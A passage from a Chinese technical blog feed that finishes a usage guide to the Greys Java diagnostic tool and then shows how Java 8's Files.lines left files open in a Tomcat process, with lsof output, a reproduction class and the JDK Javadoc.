<h4 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h4><p>显示指定方法调用的栈，带时间消耗。简单的可以看下调用链上的耗时，进一步的话就需要更加专业的<code>JProfiler</code>等工具了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;trace -n 1 com.qunar.hotel.qta.open.promotion.service.impl.Bean doSend</span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 102 ms.</span><br><span class="line">`---+Tracing for : thread_name=&quot;http-8080-181&quot; thread_id=0x507;is_daemon=true;priority=5;</span><br><span class="line">    `---+[13,13ms]com.qunar.hotel.qta.open.promotion.service.impl.Bean:doSend()</span><br><span class="line">        +---[0,0ms]com.qunar.hotel.qta.coupon.api.bean.CouponUser:&lt;init&gt;(@175)</span><br><span class="line">        +---[0,0ms]com.qunar.hotel.qta.open.promotion.bean.voucher.VoucherSendTask:getVoucherTypeId(@176)</span><br><span class="line">        +---[0,0ms]java.lang.StringBuilder:&lt;init&gt;(@176)</span><br><span class="line">        +---[0,0ms]com.qunar.hotel.qta.open.promotion.bean.voucher.VoucherSendTask:getTransactionId(@176)</span><br><span class="line">        +---[0,0ms]java.lang.StringBuilder:append(@176)</span><br><span class="line">        +---[0,0ms]java.lang.StringBuilder:append(@176)</span><br><span class="line">        +---[0,0ms]java.lang.StringBuilder:toString(@176)</span><br><span class="line">        +---[12,12ms]com.qunar.hotel.qta.coupon.api.remote.ActivityWriteRemote:consume(@176)</span><br><span class="line">        +---[12,0ms]com.qunar.hotel.qta.open.promotion.bean.voucher.VoucherSendTask:getAppName(@177)</span><br><span class="line">        +---[12,0ms]com.qunar.hotel.qta.open.promotion.bean.voucher.VoucherSendTask:getBatchSeriesNum(@177)</span><br><span class="line">        +---[12,0ms]java.lang.Long:valueOf(@177)</span><br><span class="line">        +---[12,0ms]java.util.List:size(@177)</span><br><span class="line">        +---[13,0ms]java.lang.Integer:valueOf(@177)</span><br><span class="line">        `---[13,0ms]org.slf4j.Logger:info(@177)</span><br></pre></td></tr></table></figure>
<p>最好也指定下<code>-n</code></p>
<h4 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h4><p>stack可以产品指定方法调用的stack， 支持正则， 也支持各种条件表达式，具体可以<code>help stack</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;stack -n 1  *com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener onMessage </span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 111 ms.</span><br><span class="line">thread_name=&quot;anon-com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.&lt;clinit&gt;:33-thread-6&quot; thread_id=0x20e;is_daemon=true;priority=5;</span><br><span class="line">    @com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.onMessage(BookingPromotionRollBackListener.java:-1)</span><br><span class="line">        at qunar.tc.qmq.consumer.handler.ConsumerMessage.process(ConsumerMessage.java:105)</span><br><span class="line">        at qunar.tc.qmq.consumer.handler.MessageHandler$1.run(MessageHandler.java:57)</span><br><span class="line">        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)</span><br><span class="line">        at java.util.concurrent.FutureTask.run(FutureTask.java:262)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:744)</span><br></pre></td></tr></table></figure>
<p><em>注意最好指定下-n参数，以免对线上系统造成较大的压力</em></p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>还有一些其他的用法，比如支持使用js编写自定义的脚本， 查看jvm的信息， 查看加载的类等等。</p>
<h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><blockquote>
<p>（1） 哪些命令会导致性能问题</p>
</blockquote>
<p>Greys的大部分命令性能开销都非常低廉，当然前提是一次性操作的类不要太多。</p>
<blockquote>
<p>（2） 是否能增强由BootstrapClassLoader所加载的类</p>
</blockquote>
<p>当然是可以的，但默认我封印了这个能力。主要是Greys自己也使用了大量BootstrapClassLoader所加载的类，如果处理不好极其容易造成故障。</p>
<p>你可以通过隐藏命令options激活这个功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;options unsafe true</span><br><span class="line">+--------+--------------+-------------+</span><br><span class="line">| NAME   | BEFORE-VALUE | AFTER-VALUE |</span><br><span class="line">+--------+--------------+-------------+</span><br><span class="line">| unsafe | false        | true        |</span><br><span class="line">+--------+--------------+-------------+</span><br><span class="line">Affect(row-cnt:1) cost in 2 ms.</span><br></pre></td></tr></table></figure>
<p>接下来你可以尝试增强系统类了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;monitor -c 5 java.lang.String substring</span><br><span class="line">Press Ctrl+D or Ctrl+X to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:2) cost in 35 ms.</span><br><span class="line">+---------------------+------------------+-----------+-------+---------+------+------+-----------+</span><br><span class="line">| timestamp           | class            | method    | total | success | fail | rt   | fail-rate |</span><br><span class="line">+---------------------+------------------+-----------+-------+---------+------+------+-----------+</span><br><span class="line">| 2015-06-16 23:44:54 | java.lang.String | substring | 30    | 30      | 0    | 0.23 | 0.00%     |</span><br><span class="line">+---------------------+------------------+-----------+-------+---------+------+------+-----------+</span><br></pre></td></tr></table></figure>
<p>但我话就放在这里，随意增强系统类。后果自负！</p>
<h3 id="greys-退出"><a href="#greys-退出" class="headerlink" title="greys 退出"></a>greys 退出</h3><p>greys的数据是保存在内存中的， 有些记录的栈桢需要清理，因此推荐使用<code>shutdown</code>方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;tt -l</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1001 |       1002 |  2017-11-12 17:30:40 |         20 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1002 |       1003 |  2017-11-12 17:30:41 |         10 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1003 |       1004 |  2017-11-12 17:37:27 |         10 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1004 |       1005 |  2017-11-12 17:43:15 |          2 |     true |    false |      0x14b7937c | BookingPromotionRollBackListen |                      onMessage |</span><br><span class="line">|          |            |                      |            |          |          |                 |                             er |                                |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br></pre></td></tr></table></figure>
<p>这些时间片默认是保存的，所以退出的时候需要清理下，不然对应用的gc都会有影响。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;shutdown</span><br><span class="line">Greys Server is shut down.</span><br></pre></td></tr></table></figure>
<p>greys 还提供了一个<code>reset</code>的命令，可以还原所有被增强过的类。</p>
<blockquote>
<p>  reset : Reset all the enhanced classes</p>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="https://github.com/oldmanpushcart/greys-anatomy/wiki/greys-pdf" rel="external nofollow noopener noreferrer" target="_blank">greys pdf · oldmanpushcart/greys-anatomy Wiki</a></p>
</li>
<li><p><a href="http://www.bijishequ.com/detail/435931?p=29-55" rel="external nofollow noopener noreferrer" target="_blank">Grays Anatomy源码浅析–ClassLoader,Java,Method,DES,null,方法,INVOKING</a></p>
</li>
<li><p><a href="https://github.com/oldmanpushcart/greys-anatomy/wiki/FAQ" rel="external nofollow noopener noreferrer" target="_blank">FAQ · oldmanpushcart/greys-anatomy Wiki</a></p>
</li>
<li><p><a href="http://hongkaiwen.github.io/2017/07/22/java-%E7%BA%BF%E4%B8%8A%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7-greys-anatomy-%E5%AE%9E%E8%B7%B5%E5%88%9D%E6%8E%A2/index.html" rel="external nofollow noopener noreferrer" target="_blank">java 线上调试工具 greys-anatomy 实践初探 | Kuzan</a></p>
</li>
<li><p><a href="http://calvin1978.blogcn.com/articles/btrace1.html" rel="external nofollow noopener noreferrer" target="_blank">Btrace入门到熟练小工完全指南 | 江南白衣</a></p>
</li>
<li><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5NzMyMjAwMA==&amp;mid=2651478959&amp;idx=2&amp;sn=25bac2f47851c436f27c679e77e892ae&amp;chksm=bd2537d08a52bec6d5987b98e885d5b466569a7ba621a5e93297a5490ebd2ea75a04c7b51d47&amp;mpshare=1&amp;scene=1&amp;srcid=09056wNl5ibsbHVZNqBGAT8w#rd" rel="external nofollow noopener noreferrer" target="_blank">线上服务 CPU 100%？一键定位 so easy！</a></p>
</li>
<li><p><a href="https://github.com/CSUG/HouseMD/wiki/UserGuideCN" rel="external nofollow noopener noreferrer" target="_blank">UserGuideCN · CSUG/HouseMD Wiki</a></p>
</li>
<li><p><a href="https://github.com/superhj1987/awesome-scripts" rel="external nofollow noopener noreferrer" target="_blank">superhj1987/awesome-scripts: useful scripts for Linux op</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> perf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> greys </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java8 Stream使用不当，导致文件没有关闭]]></title>
      <url>http://qsli.github.io/2017/11/04/java8-file-stream/</url>
      <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>线上巡查的时候，检查了线上机器的<code>tomcat</code>打开的文件列表，发现了一些问题。<br>一般来说，tomcat打开的文件就是一些<code>jar</code>包，日志文件, 动态库，socket等。因此用下面的命令查看下tomcat打开的文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -p <span class="variable">$pid</span> | grep / | grep -v <span class="string">".jar"</span> | grep -v <span class="string">".so"</span></span><br></pre></td></tr></table></figure>
<p>结果如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">COMMAND   PID   USER   FD   TYPE             DEVICE  SIZE/OFF      NODE NAME</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  cwd    DIR              252,2      4096    136416 /tmp/hsperfdata_tomcat</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  rtd    DIR              252,2      4096         2 /</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  mem    REG              252,2  99158576     19559 /usr/lib/locale/locale-archive</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  mem    REG              252,2     32768    131740 /tmp/hsperfdata_tomcat/25516</span><br><span class="line"></span><br><span class="line">java    25516 tomcat    0r   CHR                1,3       0t0      3674 /dev/null</span><br><span class="line"></span><br><span class="line">java    25516 tomcat    1w   REG              252,7  16965016   1836324 /logs/catalina.out</span><br><span class="line"></span><br><span class="line">java    25516 tomcat    2w   REG              252,7  16965016   1836324 /logs/catalina.out</span><br><span class="line"></span><br><span class="line">java    25516 tomcat    3w   REG              252,7   7839644   1836499 /logs/gc-201710181632.log</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   10w   REG              252,7   2741011   1835201 /logs/catalina.2017-10-18.log (deleted)</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   11w   REG              252,7      1494   1835054 /logs/localhost.2017-10-18.log (deleted)</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   40r   CHR                1,8       0t0      3678 /dev/random</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   41r   CHR                1,9       0t0      3679 /dev/urandom</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   42r   CHR                1,8       0t0      3678 /dev/random</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   43r   CHR                1,8       0t0      3678 /dev/random</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   44r   CHR                1,9       0t0      3679 /dev/urandom</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   45r   CHR                1,9       0t0      3679 /dev/urandom</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   52w   REG              252,7   7409504   1836890 /logs/access.2017-10-19.log</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   65r   REG              252,7   5665798   1836099 /cache/file_cache/fileA</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   68r   REG              252,7  67531699   1835818 /cache/file_cache/fileB</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   72r   REG              252,7   5665798   1836099 /cache/file_cache/fileA</span><br><span class="line"></span><br><span class="line">java    25516 tomcat   82r   REG              252,7  67531699   1835818 /cache/file_cache/fileB</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  180r   REG              252,7  67531699   1835818 /cache/file_cache/fileB</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  193r   REG              252,7   5665798   1836099 /cache/file_cache/fileA</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  197r   REG              252,7   5665798   1836099 /cache/file_cache/fileA</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  200r   REG              252,7  44315261   1836448 /logs/dubbo-access-provider.2017-10-19-13.log</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  204r   REG              252,7 181402005   1836417 /logs/dubbo-access-consumer.2017-10-19-13.log</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  224r   REG              252,7  67531699   1835818 /cache/file_cache/fileB</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  363r   REG              252,7  67531699   1835818 /cache/file_cache/fileB</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  365r   REG              252,7   5665798   1836099 /cache/file_cache/fileA</span><br><span class="line"></span><br><span class="line">java    25516 tomcat  573r   CHR                1,8       0t0      3678 /dev/random</span><br></pre></td></tr></table></figure>
<p>从文件列表中可以看出日志文件是一直打开的，这个是正常的，因为需要写入日志。<br>但是还有一些其他的文件，不需要写入，也一直打开，而且有的打开了好几次，这个就看起来有问题了。</p>
<p>翻代码， 发现这个文件是定时拉取的逻辑，每次从数据源拉一份文件到本地， 然后用java8的<code>Files.lines</code>和lambda进行处理。<br>下面大概复现了相关的逻辑。</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.air.collection.java8.stream.file;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.Lists;</span><br><span class="line"><span class="keyword">import</span> com.google.common.io.Resources;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ScheduledExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.stream.Collectors.toList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> qisheng.li</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> qisheng.li@qunar.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 17-11-4 下午5:07</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FilesTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ScheduledExecutorService executor = Executors.newScheduledThreadPool(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, URISyntaxException, InterruptedException </span>&#123;</span><br><span class="line">        executor.scheduleAtFixedRate(FilesTest::reloadFile, <span class="number">100</span>, <span class="number">1000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reloadFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"reload file"</span>);</span><br><span class="line">        List&lt;Integer&gt; collect = Lists.newArrayList();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            collect = Files.lines(Paths.get(Resources.getResource(<span class="string">"test.json"</span>).toURI()))</span><br><span class="line">                    .map(String::length)</span><br><span class="line">                    .collect(toList());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">            System.out.println(collect.get(<span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看进程打开的文件，可以发现有一堆的<code>test.json</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">java    23757 qishengli 8822r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8823r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8824r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8825r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8826r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8827r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8828r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8829r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8830r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8831r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8832r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8833r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8834r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br><span class="line">java    23757 qishengli 8835r   REG                8,6   257120 2229528 /Java_Tutorial/java-tutorial/src/main/target/classes/test.json</span><br></pre></td></tr></table></figure>
<p>完美复现！</p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote>
<p>Streams have a BaseStream.close() method and implement AutoCloseable, but nearly all stream instances do not actually need to be closed after use. </p>
</blockquote>
<p>一般来说，并不需要手动调用<code>Stream</code>的<code>close</code>方法， 只有背后是I/O相关的流才需要手动关闭。</p>
<blockquote>
<p>Generally, only streams whose source is an IO channel (such as those returned by Files.lines(Path, Charset)) will require closing. Most streams are backed by collections, arrays, or generating functions, which require no special resource management. (If a stream does require closing, it can be declared as a resource in a try-with-resources statement.)</p>
</blockquote>
<p>查找到打开相应文件的代码，发现使用的正是java8的<code>Files.lines</code>方法，这个方法并不会自动的将文件关闭，所以就会看到，tomcat进程多次打开了同一个文件。</p>
<p><code>Files.lines</code>方法的函数说明如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read all lines from a file as a &#123;<span class="doctag">@code</span> Stream&#125;. Unlike &#123;<span class="doctag">@link</span></span></span><br><span class="line"><span class="comment">     * #readAllLines(Path, Charset) readAllLines&#125;, this method does not read</span></span><br><span class="line"><span class="comment">     * all lines into a &#123;<span class="doctag">@code</span> List&#125;, but instead populates lazily as the stream</span></span><br><span class="line"><span class="comment">     * is consumed.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt; Bytes from the file are decoded into characters using the specified</span></span><br><span class="line"><span class="comment">     * charset and the same line terminators as specified by &#123;<span class="doctag">@code</span></span></span><br><span class="line"><span class="comment">     * readAllLines&#125; are supported.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt; After this method returns, then any subsequent I/O exception that</span></span><br><span class="line"><span class="comment">     * occurs while reading from the file or when a malformed or unmappable byte</span></span><br><span class="line"><span class="comment">     * sequence is read, is wrapped in an &#123;<span class="doctag">@link</span> UncheckedIOException&#125; that will</span></span><br><span class="line"><span class="comment">     * be thrown from the</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> java.util.stream.Stream&#125; method that caused the read to take</span></span><br><span class="line"><span class="comment">     * place. In case an &#123;<span class="doctag">@code</span> IOException&#125; is thrown when closing the file,</span></span><br><span class="line"><span class="comment">     * it is also wrapped as an &#123;<span class="doctag">@code</span> UncheckedIOException&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt; The returned stream encapsulates a &#123;<span class="doctag">@link</span> Reader&#125;.  If timely</span></span><br><span class="line"><span class="comment">     * disposal of file system resources is required, the try-with-resources</span></span><br><span class="line"><span class="comment">     * construct should be used to ensure that the stream's</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> Stream#close close&#125; method is invoked after the stream operations</span></span><br><span class="line"><span class="comment">     * are completed.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   path</span></span><br><span class="line"><span class="comment">     *          the path to the file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>   cs</span></span><br><span class="line"><span class="comment">     *          the charset to use for decoding</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>  the lines from the file as a &#123;<span class="doctag">@code</span> Stream&#125;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span>  IOException</span></span><br><span class="line"><span class="comment">     *          if an I/O error occurs opening the file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span>  SecurityException</span></span><br><span class="line"><span class="comment">     *          In the case of the default provider, and a security manager is</span></span><br><span class="line"><span class="comment">     *          installed, the &#123;<span class="doctag">@link</span> SecurityManager#checkRead(String) checkRead&#125;</span></span><br><span class="line"><span class="comment">     *          method is invoked to check read access to the file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span>     #readAllLines(Path, Charset)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span>     #newBufferedReader(Path, Charset)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span>     java.io.BufferedReader#lines()</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span>   1.8</span></span><br><span 